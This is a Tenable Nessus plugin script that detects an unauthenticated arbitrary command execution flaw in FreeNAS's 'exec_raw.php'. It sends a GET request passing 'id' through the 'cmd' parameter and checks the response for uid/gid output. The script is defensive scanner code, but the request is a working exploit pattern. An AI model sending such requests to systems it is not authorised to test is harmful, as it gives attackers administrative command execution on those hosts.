#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(50510);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2016/05/05 16:01:15 $");

  script_bugtraq_id(44974);
  script_osvdb_id(94441);
  script_xref(name:"TRA", value:"TRA-2010-04");

  script_name(english:"FreeNAS 'exec_raw.php' Arbitrary Command Execution");
  script_summary(english:"Tries to run the id command.");

  script_set_attribute(attribute:"synopsis", value:
"A web application on the remote host is affected by an arbitrary
command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of FreeNAS on the remote host fails to restrict access to
its 'exec_raw.php' script. A remote, unauthenticated attacker can pass
arbitrary commands through the script's 'cmd' parameter and have them
executed with administrative privileges.");
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2010-04");
  # http://sourceforge.net/p/freenas/code/HEAD/tree/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?64e77341");
  # http://sourceforge.net/projects/freenas/files/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?14bfd2c5");
  # https://github.com/freenas
  # Note that FreeNAS has moved its official repository to GitHub
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?aae7b1b3");
  script_set_attribute(attribute:"solution", value:"Upgrade to FreeNAS 0.7.2.5543 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'FreeNAS exec_raw.php Arbitrary Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/11/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/11/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/11/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("freenas_web_detect.nasl");
  script_require_keys("installed_sw/FreeNAS");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app_name = "FreeNAS";
get_install_count(app_name:app_name, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);
install = get_single_install(app_name:app_name, port:port);

cmd = 'id';
cmd_pat = 'uid=[0-9]+.*gid=[0-9]+.*';

url = install['dir'] + '/exec_raw.php?cmd=' + cmd;
res = http_send_recv3(method:'GET', item:url, port:port, exit_on_fail:TRUE);

if (egrep(pattern:cmd_pat, string:res[2]))
{
  if (report_verbosity > 0)
  {
    if (report_verbosity > 1)
      trailer = '\n\n  Which returned the output :\n\n' + res[2]; # http => already has trailing \r\n
    else
      trailer = NULL;

    report = 'Nessus was able to verify the issue using the following URL :\n' +
      '\n  ' + build_url(qs:url, port:port) +
      trailer + '\n';

    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app_name, build_url(port:port, qs:install['dir']));
